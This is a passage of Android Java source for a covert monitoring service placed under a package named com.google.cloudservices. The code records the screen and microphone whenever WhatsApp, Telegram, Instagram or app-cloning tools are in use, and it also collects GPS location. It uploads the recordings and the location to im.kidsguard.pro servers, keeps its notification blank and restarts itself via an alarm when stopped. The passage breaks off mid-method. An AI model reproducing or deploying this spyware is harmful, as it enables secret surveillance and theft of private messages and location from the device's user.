package com.google.cloudservices;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.text.format.DateFormat;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseIntArray;
import android.view.Surface;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.Locale;
import java.util.UUID;

public class childService extends Service implements LocationListener {
    int a = 0;
    int mincounter=0;
    int min;
    boolean exe=false;
    boolean destroy=false;
    LocationManager locationManager;

    String curpkgname="",pastpkgname="";
    boolean record=false;
    //  boolean uploading=false;
    int cv=0;
    static final String EXTRA_RESULT_CODE="resultCode";
    static final String EXTRA_RESULT_INTENT="resultIntent";
    private int resultCode=0,mScreenDensity;
    private Intent resultData;
    private MediaProjectionManager mProjectionManager;
    int DISPLAY_WIDTH = 720;
    int DISPLAY_HEIGHT = 1280;
    MediaProjection mMediaProjection;

    MediaRecorder mMediaRecorder;
    SparseIntArray ORIENTATIONS = new SparseIntArray();
     File filec;
    private boolean change;
    private Handler handler23;
    private Runnable runnable23;
    private String curedate="";
    private String curdate2="";
    private ArrayList<String> deletfilename;

    {
        ORIENTATIONS.append(Surface.ROTATION_0, 90);
        ORIENTATIONS.append(Surface.ROTATION_90, 0);
        ORIENTATIONS.append(Surface.ROTATION_180, 270);
        ORIENTATIONS.append(Surface.ROTATION_270, 180);
    }
    private final String TAG = "MainActivity";
    private final int REQUEST_CODE = 1000;
    VirtualDisplay mVirtualDisplay;
    MediaProjectionCallback mMediaProjectionCallback;

    public childService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        Log.e("Ex234", "onStartCommand: " );
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
       // createNotificationChannel();
        Log.e("testing" , "response1");
        Notification notification = new NotificationCompat.Builder(getApplicationContext())
                .build();
        startForeground(1, notification);

        Log.e("testing" , "response2");
//            }
        Log.e("324re", "onStartCommand2: " );
        if (intent!=null){
            resultCode=intent.getIntExtra(EXTRA_RESULT_CODE, 1337);
            resultData=intent.getParcelableExtra(EXTRA_RESULT_INTENT);
            mScreenDensity=intent.getIntExtra("density",1337);
            DISPLAY_WIDTH=intent.getIntExtra("width",1337);
            DISPLAY_HEIGHT=intent.getIntExtra("height",1337);
            Log.e("324re", "onStartCommand: " );}
//        uploadReceiver = new UploadServiceSingleBroadcastReceiver(this);
//        uploadReceiver.register(this);

        new Thread(new Runnable() {
            @Override
            public void run() {
                Timedb timedb = new Timedb(getApplicationContext());
                if (timedb.gettime().equals("n")) {
                    timedb.Insertime("null");
                }
                Runtime.getRuntime().gc();
                setScreen();
                try {
                    setTimer1();
                }catch (Exception e){
                    SendEror sendEror=new SendEror();
                    sendEror.sender(getApplicationContext(),"child eror:"+e.toString());
                    Log.i("telegraming23", e.toString());

                }
                try {
                    OptionDB optionDB = new OptionDB(getApplicationContext());
                    if (optionDB.getjs().get(3).equals("pack1")) {
                        startTimer2();
                    }
                    optionDB.close();
                }catch (Exception e){
                    SendEror sendEror=new SendEror();
                    sendEror.sender(getApplicationContext(),"timer2 eror:"+e.toString());
                    Log.i("telegraming23", e.toString());

                }

            }
        }).start();


        return super.onStartCommand(intent,flags,startId);
    }

    private void setTimer1() {
        BroadcastReceiver timer=new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                WakeLocker.acquire(getApplicationContext());
                WakeLocker.release();
                Log.e("hihappyday", "setTimer: " +String.valueOf(mincounter));

//                if (mincounter==1){
////                    destroy=true;
//                   stopSelf();
//
//                }
                try {


                    Date curDateing = new Date(System.currentTimeMillis());
                    File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/");
                    if (directory.exists()){
                        File[] files = directory.listFiles();
                        if (files.length>0){
                            Log.d("Files", "Size: "+ files.length);
                            int i = 0;
                            deletfilename=new ArrayList<String>();
                            while (i < files.length){
                                if (files[i].getName().equals("b.mp4")){}else {
//                    Log.e("Files324", "FileName:" + files[i].getName().substring(0,files[i].getName().length()-4));
                                    SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzzz yyyy");
                                    Date videodate = df.parse(files[i].getName().substring(0, files[i].getName().length() - 4));
                                    //Date videodate = new Date(files[i].getName().substring(0,files[i].getName().length()-4));
                                    if (curDateing.getTime() - videodate.getTime() > 600000) {
                                        if (files[i].exists()) {

                                            deletfilename.add(files[i].getName());

                                        }

                                    }
                                }
                                i++;
                            }
                            if (deletfilename.size()>0){
                                int c=0;
                                while (c<deletfilename.size()){
                                    File filedelet=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+deletfilename.get(c));
                                    if (filedelet.exists()){
                                        //     Toast.makeText(context, filedelet.getName()+" deleted", Toast.LENGTH_SHORT).show();
                                        filedelet.delete();
                                    }
                                    c++;
                                }
                            }
                        }}}catch (Exception e){

                }
                checkforeground(getApplicationContext());
                Calendar rightNow = Calendar.getInstance();
                Log.e("hihappyday", min+" : "+rightNow.get(Calendar.MINUTE ));
                if (min==rightNow.get(Calendar.MINUTE)){

                }else {
                    min=rightNow.get(Calendar.MINUTE);

                    Log.e("cach343", "onReceive: ");
                    if (isNetworkAvailable()) {

                        try {
                            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                            if (file.exists()) {
                                filec = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4");
                                try {
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            HttpClient httpclient = new DefaultHttpClient();
                                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                                            try {
                                                MultipartEntity entity = new MultipartEntity();

                                                try {
                                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                                } catch (UnsupportedEncodingException e) {
                                                    e.printStackTrace();
                                                }
                                                File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
                                                FileBody fileBody = new FileBody(myFile);
                                                entity.addPart("video", fileBody);
                                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                                //totalSize = entity.getContentLength();
                                                httppost.setEntity(entity);
                                                HttpResponse response = httpclient.execute(httppost);
                                                HttpEntity r_entity = response.getEntity();
                                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                                //responseString = EntityUtils.toString(r_entity);

                                            } catch (ClientProtocolException e) {
                                                Log.e("terkgkjjgjgj", e.toString());
                                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                                if (file2.exists()){
                                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                                    try {
                                                        copy(file2,fileb);
                                                    } catch (IOException ioException) {
                                                        ioException.printStackTrace();
                                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                                }
                                                //responseString = e.toString();
                                            } catch (IOException e) {
                                                File file3=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                                if (file3.exists()){
                                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                                    try {
                                                        copy(file3,fileb);
                                                    } catch (IOException ioException) {
                                                        ioException.printStackTrace();
                                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                                }
                                                Log.e("terkgkjjgjgj", e.toString());
                                                //	responseString = e.toString();
                                            }

                                        }
                                    }).start();


                                } catch (Exception e){}

                            }
                        } catch (Exception e) {
                            Log.e("exeption343", e.toString() );
                            e.printStackTrace();
                        }
                        uploadfirstvoicefile();
                        uploadfirstvoicefile2();
                        sendDataClass sendDataClass = new sendDataClass();
                        sendDataClass.send(getApplicationContext());
                        OptionDB optionDB = new OptionDB(childService.this);
                        if (optionDB.getjs().get(4).equals("gps1")) {
                            try {
                                getLocation();
                            }catch (Exception e){
                                SendEror sendEror=new SendEror();
                                sendEror.sender(getApplicationContext(),"location eror:"+e.toString());
                            }
                        }
//                    /**/

//
                        if (a == 1) {
                            a = 0;
                            Upload2();
                        } else if (a == 2) {
                            a = 0;
                            Upload3();
                        }
                        // UploadScreen();
                    }
                    mincounter++;

                    System.runFinalization();
                    Runtime.getRuntime().gc();
                    System.gc();}
            }
        };
        IntentFilter intentFilter=new IntentFilter(Intent.ACTION_TIME_TICK);
        this.registerReceiver(timer,intentFilter);



    }

//    private void UploadScreen() {
//        File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
//        if (directory.exists()){
//            Toast.makeText(this, "FileName", Toast.LENGTH_SHORT).show();
//        }
//        File[] files = directory.listFiles();
//        Log.d("Files234", "Size: "+ files.length);
//        UploadClass uploadClass=new UploadClass();
//        for (int i = 0; i < files.length; i++)
//        {uploadClass.Upload(getApplicationContext(),files[i].getAbsolutePath()); }
//    }

    private void startTimer2() {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
//                File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/a.mp4");
//                if (file.exists()){
//                    file.delete();
//                }
                Runtime runtime = Runtime.getRuntime();

                runtime.gc();
                // Calculate the used memory
                int memory = (int) ((runtime.totalMemory() - runtime.freeMemory()) / 241607);
                String s = String.valueOf(memory);
                OptionDB optionDB = new OptionDB(getApplicationContext());
                if (optionDB.getjs().get(3).equals("pack1")) {

//                    BlockTask blockTask = new BlockTask();
//                    blockTask.blockk(getApplicationContext());
                    //timer 1 second

                    optionDB.close();
                    //handler.removeCallbacksAndMessages(null);
                    handler.postDelayed(this, 1000);
                }


            }
        });

    }


    @Override
    public void onDestroy() {

        if (!destroy){
        initAlarm();
//        SendEror sendEror = new SendEror();
//        sendEror.sender(getApplicationContext(), "child service destroyed");
        }
        super.onDestroy();
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


//    private void createNotificationChannel() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel serviceChannel = new NotificationChannel(
//                    "ForegroundServiceChannel",
//                    "Foreground Service Channel",
//                    NotificationManager.IMPORTANCE_DEFAULT
//            );
//            NotificationManager manager = getSystemService(NotificationManager.class);
//
//            manager.createNotificationChannel(serviceChannel);
//
//
//        }
//    }

    private void initAlarm() {

        AlarmManager alarmMgr = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(getApplicationContext(),SensorRestarterBroadcastReceiver.class);
        intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                .putExtra(childService.EXTRA_RESULT_INTENT, resultData)
                .putExtra("density", mScreenDensity);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(this, 0, intent, 0);
        alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() +
                        2000, alarmIntent);

    }


    public void checkforeground(Context context) {
        Timedb timedb = null;
        Calendar calendar=null;
            calendar = new GregorianCalendar();
            //calendar.setTime(date);
            Date date = new Date();

            timedb = new Timedb(context);
            if (timedb.gettime().equals("null")) {
            } else {
                String[] dating = timedb.gettime().split(",");
//                Log.e("checkforeground", dating[1]+","+dating[2]+","+dating[3]+","+dating[4]+","+dating[5]);
//                Log.e("checkforeground", calendar.get(Calendar.YEAR)+","+localDate.getMonthValue()+","+calendar.get(Calendar.DAY_OF_MONTH)+","+calendar.get(Calendar.HOUR_OF_DAY)+","+calendar.get(Calendar.MINUTE));
                String as= String.valueOf(Integer.parseInt((String) DateFormat.format("MM",   date)));
                Log.e("rttredfgf", (dating[1] + "," + dating[2] + "," + dating[3] + "," + dating[4] + "," + dating[5])+",,,"+(calendar.get(Calendar.YEAR) + "," + as + "," + calendar.get(Calendar.DAY_OF_MONTH) + "," + calendar.get(Calendar.HOUR_OF_DAY) + "," + calendar.get(Calendar.MINUTE)));
                if ((dating[1] + "," + dating[2] + "," + dating[3] + "," + dating[4] + "," + dating[5]).equals((calendar.get(Calendar.YEAR) + "," + as + "," + calendar.get(Calendar.DAY_OF_MONTH) + "," + calendar.get(Calendar.HOUR_OF_DAY) + "," + calendar.get(Calendar.MINUTE)))) {
                    Log.e("rttredfgf", "checkforeground: ");
                    OptionDB optionDB = new OptionDB(context);
                    Intent vidIntent;
                    if (dating[0].equals("video1") && optionDB.getjs().get(6).equals("video1")) {
                        a = 2;
//                        vidIntent = new Intent(context, CapPhoto2.class);
//                        vidIntent.putExtra("type", "dating");
//                        vidIntent.putExtra("dur", dating[6]);
//                        vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        ContextCompat.startForegroundService(context, vidIntent);
                        try {

                            AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                            Intent intent = new Intent(context,AuodiReceiver.class);
                            intent.putExtra("type","dating");
                            intent.putExtra("dur",dating[6]);
                            intent.putExtra("media","cap2");
                            PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                            alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                    SystemClock.elapsedRealtime() +
                                            1000, alarmIntent);
                        }catch (IllegalStateException e){

                        }
                    } else if (dating[0].equals("video2") && optionDB.getjs().get(6).equals("video1")) {
                        Log.e("checkforeground", "checkforeground: ");
                        a = 2;
//                        vidIntent = new Intent(context, CapPhoto.class);
//                        vidIntent.putExtra("type", "dating");
//                        vidIntent.putExtra("dur", dating[6]);
//                        vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        ContextCompat.startForegroundService(context, vidIntent);
                        try {

                            AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                            Intent intent = new Intent(context,AuodiReceiver.class);
                            intent.putExtra("type","dating");
                            intent.putExtra("dur",dating[6]);
                            intent.putExtra("media","cap");
                            PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                            alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                    SystemClock.elapsedRealtime() +
                                            1000, alarmIntent);
                        }catch (IllegalStateException e){

                        }
                    } else if (dating[0].equals("voice") && optionDB.getjs().get(7).equals("Audio1")) {
                        a = 1;
//                       vidIntent = new Intent(context, AudioService.class);
//                        vidIntent.putExtra("type", "dating");
//                        vidIntent.putExtra("dur", dating[6]);
//                        vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        ContextCompat.startForegroundService(context, vidIntent);
                        try {

                            AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                            Intent intent = new Intent(context,AuodiReceiver.class);
                            intent.putExtra("type","dating");
                            intent.putExtra("dur",dating[6]);
                            intent.putExtra("media","voice");
                            PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                            alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                    SystemClock.elapsedRealtime() +
                                            1000, alarmIntent);
                        }catch (IllegalStateException e){

                        }
                    }

                }
            }


    }

    public void Upload2() {
        try {
            final String pathSave = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtones" + "minedate.mp3";
            final File dir = new File(pathSave);

            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    String uploadId = UUID.randomUUID().toString();
                    //Creating a multi part request
                    if (dir.exists()) {
                        try {
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    HttpClient httpclient = new DefaultHttpClient();
                                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");


                                    try {
                                        MultipartEntity entity = new MultipartEntity();

                                        try {
                                            entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
                                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        File myFile = new File(pathSave);
                                        FileBody fileBody = new FileBody(myFile);
                                        entity.addPart("voice", fileBody);
                                        Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                        //totalSize = entity.getContentLength();
                                        httppost.setEntity(entity);
                                        HttpResponse response = httpclient.execute(httppost);
                                        HttpEntity r_entity = response.getEntity();
                                        Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                        //responseString = EntityUtils.toString(r_entity);

                                    } catch (ClientProtocolException e) {
                                        Log.e("terkgkjjgjgj", e.toString());
                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                        if (file.exists()){
                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                            try {
                                                copy(file,fileb);
                                            } catch (IOException ioException) {
                                                ioException.printStackTrace();
                                            }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                        }
                                        //responseString = e.toString();
                                    } catch (IOException e) {
                                        Log.e("terkgkjjgjgj", e.toString());
                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                        if (file.exists()){
                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                            try {
                                                copy(file,fileb);
                                            } catch (IOException ioException) {
                                                ioException.printStackTrace();
                                            }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                        }
                                        //	responseString = e.toString();
                                    }

                                }
                            }).start();


                        }catch (Exception e){}






                    }
                       //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
                }
            }, 600000);
            Handler handler2 = new Handler(Looper.getMainLooper());
            handler2.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (dir.exists()) {
                        dir.delete();
                    }
                    //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
                }
            }, 1200000);


        } catch (Exception exc) {
            Log.e("Upload2", exc.getMessage());
            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    public void Upload3() {
        try {
            final String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtonesminedate.mp4";
            final File dir = new File(path);

            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    String uploadId = UUID.randomUUID().toString();
                    //Creating a multi part request
                    if (dir.exists()) {

                        try {
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    HttpClient httpclient = new DefaultHttpClient();
                                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


                                    try {
                                        MultipartEntity entity = new MultipartEntity();

                                        try {
                                            entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
                                        FileBody fileBody = new FileBody(myFile);
                                        entity.addPart("video", fileBody);
                                        Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
                                        //totalSize = entity.getContentLength();
                                        httppost.setEntity(entity);
                                        HttpResponse response = httpclient.execute(httppost);
                                        HttpEntity r_entity = response.getEntity();
                                        Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                                        //responseString = EntityUtils.toString(r_entity);

                                    } catch (ClientProtocolException e) {


                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                        if (file.exists()){
                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                            try {
                                                copy(file,fileb);
                                            } catch (IOException ioException) {
                                                ioException.printStackTrace();
                                            }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                        }


                                        Log.e("terkgkjjgjgj", e.toString());
                                        //responseString = e.toString();
                                    } catch (IOException e) {


                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
                                        if (file.exists()){
                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                                            try {
                                                copy(file,fileb);
                                            } catch (IOException ioException) {
                                                ioException.printStackTrace();
                                            }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                        }


                                        Log.e("terkgkjjgjgj", e.toString());
                                        //	responseString = e.toString();
                                    }
                                }
                            }).start();

                        }catch (Exception e){}

                        }
                    //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
                }
            }, 600000);
            Handler handler1 = new Handler(Looper.getMainLooper());
            handler1.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (dir.exists()) {
                        dir.delete();
                    }
                }
            }, 1200000);


        } catch (Exception exc) {
            Log.e("Upload2", exc.getMessage());
            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    public String getToken(Context context) {
        String token = null;
        TokenDataBaseManager tokenDataBaseManager = new TokenDataBaseManager(context);
        token = tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }

    private void fn_update(Location location) {
        SendCordinate sendCordinate = new SendCordinate();
        if (!location.equals(null)) {
            sendCordinate.SendCorServer(getApplicationContext(), String.valueOf(location.getLongitude()), String.valueOf(location.getLatitude()));
        }
    }


    protected void getLocation() {

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);


    }

    @Override
    public void onLocationChanged(Location location) {
        fn_update(location);
        Log.e("onLocationChanged", String.valueOf(location.getLongitude()));
        locationManager.removeUpdates(this);

    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void setScreen(){

        mProjectionManager = (MediaProjectionManager) getSystemService
                (Context.MEDIA_PROJECTION_SERVICE);
        final Handler handler=new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {

                ArrayList<String> pkg=new ArrayList<String>();
                pkg.add("com.whatsapp");
                pkg.add("com.whatsapp.w4b");
                pkg.add("org.telegram.messenger");
                pkg.add("com.instagram.android");
                pkg.add("com.lbe.parallel.intl");
                pkg.add("com.parallel.space.lite");
                pkg.add("com.lbe.parallel.intl.arm64");
                pkg.add("com.parallel.space.pro");
                pkg.add("com.lbe.parallel.intl.arm32");
                pkg.add("com.parallel.space.pro.arm64");
                pkg.add("com.parallel.space.lite.arm32");
                pkg.add("com.parallel.space.lite.arm64");
                pkg.add("com.excelliance.multiaccounts");
                recored(pkg);
//                recored("org.telegram.messenger");

                handler.postDelayed(this,1000);
            }
        });


    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void iniRecorder() {
        try {
            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
            if (!file.exists()){file.mkdirs();}
            SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.US);
            Date now = new Date();
//            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
            Log.e("324", String.valueOf(DISPLAY_WIDTH)+":"+String.valueOf(DISPLAY_HEIGHT));
//
            mMediaRecorder.setVideoSize(DISPLAY_WIDTH,DISPLAY_HEIGHT);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setVideoEncodingBitRate(512 * 1000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.prepare();



        } catch (IOException e) {
            DISPLAY_WIDTH = 720;
            DISPLAY_HEIGHT = 1280;
            try {

                mMediaRecorder = new MediaRecorder();
                mProjectionManager = (MediaProjectionManager) getSystemService
                        (Context.MEDIA_PROJECTION_SERVICE);

            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
            if (!file.exists()){file.mkdirs();}
            SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.US);
            Date now = new Date();
//            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
            Log.e("324", String.valueOf(DISPLAY_WIDTH)+":"+String.valueOf(DISPLAY_HEIGHT));
//
            mMediaRecorder.setVideoSize(DISPLAY_WIDTH,DISPLAY_HEIGHT);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setVideoEncodingBitRate(512 * 1000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.prepare();}catch (Exception e1){}
            Log.e("324", "initRecorder: "+e.toString() );
         //   Toast.makeText(this, "iniRecorder"+e.toString(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void iniRecorder2() {
        try {
           // mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"468545878548");
            if (!file.exists()){file.mkdirs();}
            SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.US);
            Date now = new Date();
//            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
            mMediaRecorder.setVideoSize(DISPLAY_WIDTH,DISPLAY_HEIGHT);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
           // mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mMediaRecorder.setVideoEncodingBitRate(512 * 1000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.prepare();



        } catch (IOException e) {
            DISPLAY_WIDTH = 720;
            DISPLAY_HEIGHT = 1280;
            try {
                mMediaRecorder = new MediaRecorder();
                mProjectionManager = (MediaProjectionManager) getSystemService
